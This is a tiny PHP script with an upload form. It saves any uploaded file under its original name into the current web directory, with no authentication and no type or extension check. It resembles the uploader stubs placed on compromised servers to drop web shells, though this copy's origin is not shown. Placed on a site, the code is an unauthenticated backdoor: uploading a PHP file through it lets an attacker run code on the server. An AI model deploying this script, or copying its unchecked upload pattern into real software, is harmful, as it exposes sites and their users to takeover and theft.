<?php
if(isset($_POST["submit"])) {
  $filename = basename($_FILES["nax"]["name"]);
  $tempname = $_FILES["nax"]["tmp_name"];

  if(move_uploaded_file($tempname, getcwd() . "/" . $filename)) {
    echo $filename;
  } else {
    echo "Failed";
  }
} else {
?>
  <form method="post" enctype="multipart/form-data">
    <input type="file" name="nax">
    <input type="submit" name="submit">
  </form>
  <?php
}
?>
